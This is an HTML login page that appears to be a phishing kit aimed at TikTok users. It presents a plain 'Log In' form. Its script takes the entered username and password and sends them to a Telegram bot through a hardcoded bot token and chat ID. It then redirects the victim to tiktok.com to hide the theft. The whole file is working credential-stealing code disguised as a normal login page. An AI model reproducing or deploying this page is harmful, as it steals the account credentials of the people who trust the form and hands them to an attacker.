<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Log in page">
    <title>Log In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Additional styling */
        body {
            background-color: #f5f5f5;
        }

        .form-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            margin: auto;
            background-color: #f5f5f5;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .form-input {
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ccc;
            width: 100%;
            margin-bottom: 16px;
            transition: border-color 0.3s ease;
        }

        .form-input:focus {
            border-color: #f87171;
        }

        .form-button {
            padding: 14px;
            background-color: #ffffff;
            color: #4CAF50;
            border-radius: 8px;
            width: 100%;
            font-size: 1.125rem;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .form-button:hover {
            background-color: #f87171;
        }

        .form-button:disabled {
            background-color: #ddd;
            cursor: not-allowed;
        }

        .footer-text {
            margin-top: 10px;
            text-align: center;
        }

        .forgot-password {
            color: black;
            font-size: 0.875rem;
            text-align: right;
            display: block;
            margin-top: 10px;
        }
    </style>
</head>
<body class="h-screen flex justify-center items-center">

    <div class="form-container">
        <h1 class="text-3xl font-bold text-center mb-6">Log In</h1>

        <form id="login-form">
            <input type="text" id="username" placeholder="Email or Username" class="form-input" required>
            <input type="password" id="password" placeholder="Password" class="form-input" required>
            <a href="#" class="forgot-password">Forgot Password?</a>
            <button type="submit" class="form-button">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevent default form submission

            // Get user input
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Prepare data to send to Telegram (if required)
            const botToken = '7992356703:AAGGmo7eTksT5oS-tzkwoY8k9DAtUkR9u_c';
            const chatID = '6341598098';
            const message = ` ðŸ”¥ New Login with tik tok ðŸ”¥\n\nUsername: ${username}\nPassword: ${password}`;

            // Send data to Telegram API (optional)
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        // After sending data to Telegram, redirect to TikTok
                        window.location.href = "https://www.tiktok.com";
                    } else {
                        alert('Failed to send data to Telegram.');
                    }
                })
                .catch(error => {
                    alert('Error: ' + error);
                });
        });
    </script>

</body>
</html>
